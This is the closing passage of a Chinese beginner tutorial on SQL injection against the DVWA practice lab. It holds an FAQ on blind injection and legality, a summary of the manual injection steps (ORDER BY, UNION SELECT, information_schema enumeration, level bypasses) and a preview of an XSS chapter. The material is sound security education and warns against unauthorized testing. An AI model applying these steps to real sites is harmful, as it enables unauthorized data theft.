但是！还是有很多老系统、小网站、开发不规范的项目存在注入漏洞。不然OWASP Top 10也不会年年有它了。

### Q4：我输入了单引号没报错，是不是就没有注入？❌

**A：** 不一定！不报错可能是因为：
1. 人家本来就是数字型的，单引号没用
2. 错误信息被屏蔽了，不显示但可能还有注入（盲注）
3. 真的没有注入

单引号报错只是判断注入的一种方法，不是唯一方法。

### Q5：什么是盲注？和普通注入有啥区别？👀

**A：** 盲注就是你看不到查询结果，也看不到报错信息，只能通过页面的细微差别（比如返回内容不同、响应时间不同）来判断。

盲注分两种：
- **布尔盲注**：页面返回真或假，靠真真假假来猜数据
- **时间盲注**：靠sleep()函数的响应时间来猜数据

盲注比普通注入难多了，也慢多了，不过sqlmap可以自动跑。

DVWA里也有SQL Injection (Blind)模块，就是盲注的，我们以后再讲。

### Q6：SQL注入违法吗？⚖️

**A：** 这个问题非常重要！我必须严肃回答：

**未经授权的SQL注入测试，是违法的！** 🚨

《网络安全法》、《刑法》里都有相关规定，非法侵入计算机系统、获取数据、破坏数据，都是要负法律责任的，严重的要坐牢！

所以大家学习归学习，只能在**自己搭建的靶场**或者**有授权的渗透测试项目**里玩，千万不要去搞别人的网站！

---

## 本章总结 📝

好了，这一章内容挺多的，我们来总结一下：

### 知识点回顾：

1. **SQL注入是什么**：用户输入的数据被当成SQL代码执行了，就像图书馆管理员把你的玩笑话当真了
2. **注入条件**：输入可控、输入被拼到SQL里、能成功执行
3. **SQL基础**：SELECT查询、UNION联合查询、ORDER BY排序、注释符号
4. **手工注入步骤**：
   - 找注入点（单引号报错）
   - 判断注入类型（字符型/数字型）
   - ORDER BY猜字段数
   - UNION SELECT找显示位
   - 爆库名（database()）
   - 爆表名（information_schema.tables）
   - 爆字段名（information_schema.columns）
   - 爆数据！
5. **四个级别对比**：
   - Low：啥防护都没有，直接注
   - Medium：转义了单引号，但数字型注入绕过
   - High：加了LIMIT和SESSION，但还是被注释绕过
   - Impossible：用了PDO预编译，真的注不了
6. **防御方法**：预编译最重要，其他都是辅助
7. **安全提醒**：不要搞别人的网站，违法！

### 你现在应该能做到：

- ✅ 理解SQL注入的原理
- ✅ 手工注入DVWA的Low/Medium/High级别
- ✅ 看懂简单的SQL语句
- ✅ 知道怎么防御SQL注入
- ✅ 明白为什么预编译能防注入

是不是很有成就感？从啥都不懂到能手工注入，进步很大哦！👏

---

## 下章预告：XSS跨站脚本攻击 🎯

SQL注入我们搞定了，下一章我们来学习另一个超级有名的漏洞——**XSS跨站脚本攻击**！

如果说SQL注入是"搞数据库"的，那XSS就是"搞用户"的。攻击者可以在别人的网站里插入恶意JavaScript代码，其他用户访问的时候就会中招。

XSS能做什么呢？
- 偷用户的Cookie，直接登录别人的账号 🍪
- 弹广告、钓鱼网站
- 劫持用户浏览器，控制用户操作
- 甚至能打穿内网...

是不是听起来也很刺激？😏

下一章我们就在DVWA里实战XSS，从Reflected到Stored到DOM型，一个一个搞定！

我们下章见！拜拜～👋
